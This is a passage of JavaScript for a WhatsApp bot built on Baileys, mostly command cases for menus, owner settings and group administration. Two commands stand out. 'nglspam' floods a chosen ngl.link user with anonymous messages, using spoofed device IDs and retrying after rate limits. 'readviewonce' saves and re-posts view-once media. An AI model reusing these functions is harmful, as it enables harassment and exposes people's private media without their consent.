await Hisoka.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
}
break
case 'sc': {
 let name = m.pushName || Hisoka.getName(m.sender);
let panduan = `
[ 𝚅𝚛𝚞𝚜𝚑 𝙼𝚊𝚛𝚒𝚊 𝚟𝟸 ]
- 1000 Features
- Type Case
- Bug Features
- All Features Work
- Photo Editor
- Keep Group Safe
- Auto AI
- Fast Response
- Node.js 23 Only
-`

const url = `${global.thumbnail}`
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Hisoka.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: `${global.thumbnail}` } }, { upload: Hisoka.waUploadToServer })),
          gifPlayback: false,
          hasMediaAttachment: false
        }),
                body: {
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Script\",\"url\":\"https://whatsapp.com/channel/0029Vb2K7scK0IBkPoAGgk28/1743\",\"merchant_url\":\"https://whatsapp.com\"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

await Hisoka.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
}
break

// ============{ Menu } ===============//
case "menu": {
let me = m.sender
HisokaReact()
menureply(`*\`click the button to see the menu\`*`)
}
break
case "menuall": {
HisokaReact()
menureply(`${global.allmenu}`)
}
break
case "menuowner": {
HisokaReact()
menureply(`${global.menuowner}`)
}
break
case "menugroup": {
HisokaReact()
menureply(`${global.menugroup}`)
}
break
case "menuai": {
HisokaReact()
menureply(`${global.menuai}`)
}
break
case "menudownload": {
HisokaReact()
menureply(`${global.menudownload}`)
}
break
case "menuconvert": {
HisokaReact()
menureply(`${global.menuconvert}`)
}
break
case "menurandom": {
HisokaReact()
menureply(`${global.menurandom}`)
}
break
case "menufun": {
HisokaReact()
menureply(`${global.menufun}`)
}
break
case "menuother": {
HisokaReact()
menureply(`${global.menuother}`)
}
break
case "menunsfw": {
HisokaReact()
menureply(`${global.menunsfw}`)
}
break
case "menufortune": {
HisokaReact()
menureply(`${global.menufortune}`)
}
break
case "menuquotes": {
HisokaReact()
menureply(`${global.menuquotes}`)
}
break
case "menugallery": {
HisokaReact()
menureply(`${global.menugallery}`)
}
break
case "menupush": {
HisokaReact()
menureply(`${global.menupush}`)
}
break

break
case "menuanime": {
HisokaReact()
menureply(`${global.menuanime}`)
}
break
case "menumaker": {
HisokaReact()
menureply(`${global.menumaker}`)
}
break
case "menusad": {
HisokaReact()
menureply(`${global.menusad}`)
}
break
case "menugenshin": {
HisokaReact()
menureply(`${global.menugenshin}`)
}
break
case "menunews": {
HisokaReact()
menureply(`${global.menunews}`)
}
break
case "menurandomvid": {
HisokaReact()
menureply(`${global.menurandomvid}`)
}
break
case "menumenfess": {
HisokaReact()
menureply(`${global.menumenfess}`)
}
break
case "menugame": {
HisokaReact()
menureply(`${global.menugame}`)
}
break
case "menustore": {
HisokaReact()
menureply(`${global.menustore}`)
}
break
case "menusearch": {
HisokaReact()
menureply(`${global.menuse}`)
}
break
case "menubug": {
HisokaReact()
menureply(`${global.menubug}`)
}
break
case "menustalk": {
HisokaReact()
menureply(`${global.stalkmenu}`)
}
break
case "menumain": {
HisokaReact()
menureply(`${global.menu}`)
}
break
// ============{ Batas }==========//
// ============Owner
case "nglspam":
        {
          if (!isOwner) {
            return reply(mess.owner);
          }
          if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
            return reply("Enter username, message, and spam count!\nExample: .nglspam username|hello|5");
          }
          async function sendSpamMessage(username, message, spamCount) {
            let counter = 0;
            while (counter < spamCount) {
              try {
                const date = new Date();
                const minutes = date.getMinutes();
                const hours = date.getHours();
                const formattedDate = `${hours}:${minutes}`;
                const deviceId = crypto.randomBytes(21).toString("hex");
                const url = "https://ngl.link/api/submit";
                const headers = {
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                  Accept: "*/*",
                  "Accept-Language": "en-US,en;q=0.5",
                  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                  "X-Requested-With": "XMLHttpRequest",
                  "Sec-Fetch-Dest": "empty",
                  "Sec-Fetch-Mode": "cors",
                  "Sec-Fetch-Site": "same-origin",
                  Referer: `https://ngl.link/${username}`,
                  Origin: "https://ngl.link"
                };
                const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;
                const response = await fetch(url, {
                  method: "POST",
                  headers,
                  body,
                  mode: "cors",
                  credentials: "include"
                });
                if (response.status !== 200) {
                  console.log(`[${formattedDate}] [Err] Ratelimited`);
                  await new Promise(resolve => setTimeout(resolve, 25000));
                } else {
                  counter++;
                  console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
                }
              } catch (error) {
                console.error(`[${formattedDate}] [Err] ${error}`);
                await new Promise(resolve => setTimeout(resolve, 5000));
              }
            }
          }
          ;
          const [username, message, count] = text.split("|");
          const spamCount = parseInt(count, 10);
          if (isNaN(spamCount) || spamCount <= 0) {
            return reply("Spam count must be a positive number!");
          }
          try {
            await sendSpamMessage(username, message, spamCount);
            reply(`Successfully sent ${spamCount} NGL messages to ${username}`);
          } catch (e) {
            console.error(e); // Adding error logging for debugging
            return reply("Feature error, try again later.");
          }
        }
       
        break;
    case 'upstatuswa':
    case 'upstatus':
    case 'gcsw':
    case 'upwsgc':
    case 'upswtag': {
      if (!isOwner) return reply(mess.owner)
      let argsText = text.split(',').map(a => a.trim())
      if (argsText.length < 2) return m.reply(`Example: ${command} groupid, text`)

      let target = argsText[0]
      let caption = argsText.slice(1).join(',')

      if (!quoted) return m.reply(`Reply to an image, video, or audio message with caption ${command}`)

      if (quoted.mtype === "audioMessage") {
        let audioData = await quoted.download()
        Hisoka.sendStatusMention({
            audio: audioData,
            mimetype: 'audio/mp4',
            ptt: true
          },
          [target]
        )
      }

      if (quoted.mtype === "imageMessage") {
        let imageData = await quoted.download()
        Hisoka.sendStatusMention({
            image: imageData,
            caption: caption || ''
          },
          [target]
        )
      }

      if (quoted.mtype === "videoMessage") {
        let videoData = await quoted.download()
        Hisoka.sendStatusMention({
            video: videoData,
            caption: caption || ''
          },
          [target]
        )
      }
      m.reply('Successfully sent status mention!')
    }
    break
case "off": {
if (!isOwner) return reply(mess.owner)
await Hisoka.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'Interactive menu message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '',
          sections: [
            {
              title: `© ${namaBot}`,
              rows: [
                {
                  title: 'Disable AutoTyping',
                  description: 'false', 
                  id: `.autotyping off`
                },
                {
                  title: 'Disable AutoRead',
                  description: 'false', 
                  id: `.autoread off`
                  },
                {
                  title: 'Disable AutoBio',
                  description: 'false', 
                  id: `.autobio off`
                  },
                {
                  title: 'Disable Prayer Reminders',
                  description: 'false', 
                  id: `.autosholat off`
                  },
                {
                  title: 'Disable Group Only',
                  description: 'false', 
                  id: `.onlygc off`
                }             
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Bot Settings"
}, { quoted: m })
}
break
case "on": {
if (!isOwner) return reply(mess.owner)
await Hisoka.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'Interactive menu message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '',
          sections: [
            {
              title: `© ${namaBot}`,
              rows: [
                {
                  title: 'Enable AutoTyping',
                  description: 'true', 
                  id: `.autotyping on`
                },
                {
                  title: 'Enable AutoRead',
                  description: 'true', 
                  id: `.autoread on`
                   },
                {
                  title: 'Enable AutoBio',
                  description: 'true', 
                  id: `.autobio on`
                  },
                {
                  title: 'Enable Prayer Reminders',
                  description: 'true', 
                  id: `.autosholat on`
                  },
                {
                  title: 'Enable Group Only',
                  description: 'true', 
                  id: `.onlygc on`
                }             
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Bot Settings"
}, { quoted: m })
}
break
case "listcase": {
if (!isOwner) return reply(mess.owner)
const code = fs.readFileSync('Hisoka.js', 'utf8');
const regex = /case\s+["'`](.+?)["'`]\s*:/g;
let match;
const cases = [];
while ((match = regex.exec(code)) !== null) {
  cases.push(match[1]);
}
return reply(`
*Total Commands:* ${cases.length}

> ${cases.join("\n> ")}
`)
}
break
case "reactch":
case "rch": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("Example:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️hisoka\n.reactch https://whatsapp.com/channel/xxx/123 ❤️hisoka|5");

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const [mainText, offsetStr] = text.split('|');
    const argsa = mainText.trim().split(" ");
    const link = argsa[0];

    if (!link.includes("https://whatsapp.com/channel/")) {
        return m.reply("Invalid link!\nExample: .reactch https://whatsapp.com/channel/xxx/messageid ❤️react|3");
    }

    const channelId = link.split('/')[4];
    const rawMessageId = parseInt(link.split('/')[5]);
    if (!channelId || isNaN(rawMessageId)) return m.reply("Incomplete link!");
    const offset = parseInt(offsetStr?.trim()) || 1;
    const teksNormal = argsa.slice(1).join(' ');
    const teksTanpaLink = teksNormal.replace(link, '').trim();
    if (!teksTanpaLink) return m.reply("Enter text/emoji to react with.");
    const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const metadata = await Hisoka.newsletterMetadata("invite", channelId);
        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await Hisoka.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                failed++;
            }
        }
        m.reply(`✅ Successfully sent reaction *${emoji}* to ${success} messages in channel *${metadata.name}*\n❌ Failed to ${failed} messages`);
    } catch (err) {
        console.error(err);
        m.reply("❌ Failed to process request!");
    }
}
break
case "clearchat":
      case "clc":
        {
          if (!isOwner) {
            return reply(mess.owner);
          }
          Hisoka.chatModify({
            delete: true,
            lastMessages: [{
              key: m.key,
              messageTimestamp: m.messageTimestamp
            }]
          }, m.chat);
        }
        break;
case "rvo": case "readviewonce": {
 if (!isOwner) return reply(mess.owner);
if (!m.quoted) return reply("reply to the viewOnce message!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return reply("That message is not a view once message!")
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Hisoka.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Hisoka.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Hisoka.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
case 'listgc': {
 if (!isOwner) return reply(mess.owner);

 try {
 const getGroups = await Hisoka.groupFetchAllParticipating();
 const groups = Object.values(getGroups);

 if (!groups.length) return reply('❌ Bot is not joined to any groups.');

 let teks = `⬣ *LIST GROUP ${namaBot.toUpperCase()}*\n📊 Total Groups: ${groups.length}\n\nGroup List:\n\n`;

 const buttons = [];

 groups.forEach((g, i) => {
 const groupId = g.id;
 const groupName = g.subject;
 const memberCount = g.participants?.length || 0;
 const created = moment(g.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm') + ' WIB';

 teks += `*${i + 1}. ${groupName}*\n`;
 teks += `🆔 ID: ${groupId}\n👥 Members: ${memberCount}\n🕐 Created: ${created}\n\n`;

 buttons.push({
 name: 'cta_copy',
 buttonParamsJson: JSON.stringify({
 display_text: `📋 Copy ID GC #${i + 1}`,
 copy_code: groupId,
 id: `gc-${i + 1}`
 })
 });
 });

 await Hisoka.sendMessage(m.chat, {
 text: teks,
 footer: `📌 Click button to copy group ID`,
 title: `📃 Active Group List`,
 interactiveButtons: buttons
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 cpe('❌ Failed to get group data.');
 }
}
break

case "listowner": case "listown": {
if (owner.length < 1) return m.reply("No additional owners")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owner) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Hisoka.sendMessage(m.chat, {text: teks, mentions: owner}, {quoted: m})
}
break


case "delowner": case "delown": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Cannot remove main owner!`)
if (!owner.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owner.indexOf(input)
await owner.splice(posi, 1)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))
m.reply(`Successfully removed owner ✅`)
}
break
case "addowner": case "addown": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owner.includes(input) || input === botNumber) return m.reply(`Number ${input2} is already bot owner!`)
owner.push(input)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))
m.reply(`Successfully added owner ✅`)
}

break
case "joingc": case "join": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("group link required")
if (!text.includes("chat.whatsapp.com")) return m.reply("Invalid group link")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Hisoka.groupAcceptInvite(result)
m.reply(`Successfully joined the group ${id}`)
}

break
case "listprem": {
if (!isOwner) return reply(mess.owner)
if (premium.length < 1) return reply("No Premium Users :(")
let teks = `\nList All Premium Users\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Hisoka.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: qcontacts})
}
break
case "addprem": {
if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`𝘕𝘰𝘮𝘰𝘳 ${input2} 𝘴𝘶𝘥𝘢𝘩 𝘔𝘦𝘯𝘫𝘢𝘥𝘪 𝘗𝘳𝘦𝘮𝘪𝘶𝘮!`)
premium.push(input)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
}
break
case "delprem": {
    if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Delete success`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
}
break
case "public":{
if (!isOwner) return reply(mess.owner)
Hisoka.public = true
reply(`successfully changed to ${command}`)
}
break
case "self":{
if (!isOwner) return reply(mess.owner)
Hisoka.public = false
reply(`successfully changed to ${command}`)
}
break
case 'delppbot': {
if (!isOwner) return reply(mess.owner)
await Hisoka.removeProfilePicture(Hisoka.user.id)
reply(`Successfully removed bot profile picture`)
}
break
case 'setppbot':{
if (!isOwner) return reply(mess.owner)
if (!/image/.test(mime)) return reply(`Send/Reply Image with Caption ${prefix + command}`)
if (/webp/.test(mime)) return pesan(`Send/Reply Image with Caption ${prefix + command}`)
var medis = await Hisoka.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (text == 'full') {
var {
img
} = await generateProfilePicture(medis)
await Hisoka.query({
tag: 'iq',
attrs: {
to: botNumber,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [{
tag: 'picture',
attrs: {
type: 'image'
},
content: img
}]
})
fs.unlinkSync(medis)
reply("done")
} else {
var memeg = await Hisoka.updateProfilePicture(botNumber, {
url: medis
})
fs.unlinkSync(medis)
reply(mess.done)
}
}

break
case "tojs": case "q": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break 
case 'readchange': case 'autoread':{
if (!isOwner) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q === 'on') {
global.autoread = true
m.reply(`Successfully changed autoread to ${q}`)
} else if (q === 'off') {
global.autoread = false
m.reply(`Successfully changed autoread to ${q}`)
}
}

break
    case 'autotyping': {
if (!isOwner) return reply(mess.owner)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.autotyping = true
await m.reply('Auto typing successfully activated.')
} else if (args[0] === 'off') {
global.autotyping = false
await m.reply('Auto typing successfully deactivated.')
}}

break               
case 'autoprayer': case 'autosholat': {
Hisoka.autoshalat = Hisoka.autoshalat ? Hisoka.autoshalat : {}

 if (!isOwner) return reply(mess.owner)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)

 if (text === "on") {
 Hisoka.autoshalat[sender] = {
 messages: []
 };
 m.reply(`[ ✓ ] Success *\`Auto-Prayer\`* mode: ᴀᴄᴛɪᴠᴇ`);
 } else if (text === "off") {
 delete Hisoka.autoshalat[sender];
 m.reply(`[ ✓ ] Success *\`Auto-Prayer\`* mode: ɪɴᴀᴄᴛɪᴠᴇ`);
 }
};
break 
    case 'onlygc': {
if (!isOwner) return reply(mess.owner)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.onlygc = true
await m.reply(`Successfully activated ${prefix+command}.`)
} else if (args[0] === 'off') {
global.onlygc = false
await m.reply(`Successfully deactivated ${prefix+command}.`)
}}

break                         
case 'antilinkall': {
if (!isOwner) return reply(mess.owner)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.Antilinkall = true
await m.reply(`Successfully activated ${prefix+command}.`)
} else if (args[0] === 'off') {
global.Antilinkall = false
await m.reply(`Successfully deactivated ${prefix+command}.`)
}}

break            
case 'autoaigc':
case 'autoai': {
if (!isOwner) return reply(mess.owner)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.autoaigc = true
await m.reply(`Successfully activated ${command}.`)
} else if (args[0] === 'off') {
global.autoaigc = false
await m.reply(`Successfully deactivated ${command}.`)
}}

break               
case 'autobio': {
if (!isOwner) return reply(mess.owner)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.autobio = true
await m.reply(`Successfully activated ${command}.`)
} else if (args[0] === 'off') {
global.autobio = false
await m.reply(`Successfully deactivated ${command}.`)
}}

break               
// ============Group
case "gc": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
await Hisoka.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'Interactive menu message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '',
          sections: [
            {
              title: `© ${namaBot}`,
              rows: [
                {
                  title: 'Open Group',
                  description: 'open', 
                  id: `.open`
                },
                {
                  title: 'Close Group',
                  description: 'close', 
                  id: `.close`
                }             
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Group Settings"
}, { quoted: m })
}
break
case 'delete':
                        case 'd':
                        case 'del': {
                        if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
                                if (!m.quoted) return reply('Hey, you need to send the message you want to delete! 🤔')
                                await Hisoka.sendMessage(m.chat, {
                                        delete: {
                                                remoteJid: m.chat,
                                                id: m.quoted.id,
                                                participant: m.quoted.sender
                                        }
                                })
                        }
                        break
case 'antibot': {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.antibotGroups = true
await m.reply(`Successfully activated ${prefix+command}.`)
} else if (args[0] === 'off') {
global.antibotGroups = false
await m.reply(`Successfully deactivated ${prefix+command}.`)
}}

break            

case 'antilink4':
case 'antilinkig': {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.Antilinkig = true
await m.reply(`Successfully activated ${command}.`)
} else if (args[0] === 'off') {
global.Antilinkig = false
await m.reply(`Successfully deactivated ${command}.`)
}}

break               
case 'antilink3':
case 'antiwame': {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.antiWame = true
await m.reply(`Successfully activated ${command}.`)
} else if (args[0] === 'off') {
global.antiWame = false
await m.reply(`Successfully deactivated ${command}.`)
}}

break               
case 'antilink2':
case 'antilinkch': {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.Antilinkch = true
await m.reply(`Successfully activated ${command}.`)
} else if (args[0] === 'off') {
global.Antilinkch = false
await m.reply(`Successfully deactivated ${command}.`)
}}

break               
case 'antilink':
case 'antilinkgc': {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`)
if (args[0] === 'on') {
global.Antilinkgc = true
await m.reply(`Successfully activated ${command}.`)
} else if (args[0] === 'off') {
global.Antilinkgc = false
await m.reply(`Successfully deactivated ${command}.`)
}}

break               
case'dor': case "kick": case "kik": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Hisoka.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Number not registered on WhatsApp")
const res = await Hisoka.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Successfully removed ${input.split("@")[0]} from this group`)
} else {
return m.reply("@tag/reply to someone")
}
}

break
case "linkgc": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
const urlGrup = "https://chat.whatsapp.com/" + await Hisoka.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Hisoka.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}

break
case "resetlinkgc": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
await Hisoka.groupRevokeInvite(m.chat)
m.reply("Successfully reset group link ✅")
}

break
case "totag":{
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
 let users = participants.map(u => u.id).filter(v => v !== Hisoka.user.jid)
 if (!m.quoted) return reply(`✳️ Reply to a message`)
 Hisoka.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: users } )
}
break
case 'closetime':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (args[1]=="seconds") {var timer = args[0]*`1000`
} else if (args[1]=="minutes" || args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="hours" || args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="days" || args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*choose:*\nsecond\nminute\nhour\n\n*example*\n10 second")}
 reply(`Close time ${q} starting from now`)
setTimeout( () => {
const close = `*Right on time* group closed by admin\nnow only admins can send messages`
Hisoka.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (args[1] == 'seconds') {
var timer = args[0] * `1000`
} else if (args[1] == 'minutes' || args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'hours' || args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'days' || args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*choose:*\nsecond\nminute\nhour\n\n*example*\n10 second')
}
reply(`Open Time ${q} Starting From Now`)
setTimeout(() => {
const nomor = m.participant
const open = `*On Time* Group opened by admin\nNow members can send messages`
Hisoka.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}

break

case "closegc": case "close": 
case "opengc": case "open": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
m.reply(`.${command}time 1 seconds`)
}
break
case "demote":
case "promote": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Hisoka.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Hisoka.sendMessage(m.chat, {text: `Successfully ${action.toLowerCase()}d @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply("@tag/6285###")
}
}

break
case 'delppgc':{
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
await Hisoka.removeProfilePicture(from)
}
break
case 'setppgc':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
if (!/image/.test(mime)) return reply(`Send/Reply Image Caption Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Send/Reply Image with Caption ${prefix + command}`)
var medis = await Hisoka.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (text == 'full') {
var {
img
} = await generateProfilePicture(medis)
await Hisoka.query({
tag: 'iq',
attrs: {
to: m.chat,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [{
tag: 'picture',
attrs: {
type: 'image'
},
content: img
}]
})
fs.unlinkSync(medis)
reply(mess.done)
} else {
var memeg = await Hisoka.updateProfilePicture(m.chat, {
url: medis
})
fs.unlinkSync(medis)
reply(mess.done)
}

break
case 'tagall':{
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
const textMessage = args.join(" ") || "nothing";
let teks = `Tag all message :\n> *${textMessage}*\n\n`;
const groupMetadata = await Hisoka.groupMetadata(m.chat);
const participants = groupMetadata.participants;
for (let mem of participants) {
teks += `@${mem.id.split("@")[0]}\n`;
}
Hisoka.sendMessage(m.chat, {
text: teks,
mentions: participants.map((a) => a.id)
}, { quoted: m });
}
break         
case "h":
case "hidetag": {
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
if (m.quoted) {
Hisoka.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
